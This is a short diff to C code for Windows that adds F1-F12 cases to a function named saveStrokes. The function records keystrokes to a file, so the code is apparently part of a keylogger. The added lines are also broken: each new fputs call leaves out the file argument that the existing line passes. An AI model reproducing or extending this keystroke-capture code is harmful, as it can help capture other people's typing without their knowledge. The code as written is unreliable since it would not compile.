@@ -644,6 +644,30 @@ void saveStrokes(DWORD vkCode, bool systemCommandFlag) {
 			}
 		}
 		switch (vkCode) {
+		case VK_F1:	fputs("[F1 Key]");
+					break;
+		case VK_F2:	fputs("[F2 Key]");
+					break;
+		case VK_F3:	fputs("[F3 Key]");
+					break;
+		case VK_F4:	fputs("[F4 Key]");
+					break;
+		case VK_F5:	fputs("[F5 Key]");
+					break;
+		case VK_F6:	fputs("[F6 Key]");
+					break;
+		case VK_F7:	fputs("[F7 Key]");
+					break;
+		case VK_F8:	fputs("[F8 Key]");
+					break;
+		case VK_F9:	fputs("[F9 Key]");
+					break;
+		case VK_F10:	fputs("[F10 Key]");
+					break;
+		case VK_F11:	fputs("[F11 Key]");
+					break;
+		case VK_F12:	fputs("[F12 Key]");
+					break;
 		case VK_CAPITAL:	if (!GetKeyState(VK_CAPITAL)) {
 			fputs("[CAP'S LOCK ON]", tempFile);
 		}
